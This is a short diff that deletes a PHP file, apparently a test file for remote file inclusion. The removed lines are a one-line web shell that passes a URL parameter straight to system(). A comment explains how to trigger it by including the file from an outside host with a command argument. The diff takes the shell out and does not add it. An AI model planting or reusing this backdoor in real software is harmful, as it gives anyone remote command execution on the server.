@@ -1,4 +1,0 @@
-<?php 
-  system($_GET['c']);
-  // Load the value for 'c' with https://rafaelhart.com/x/testfileinclude.txt&c=command
-?>
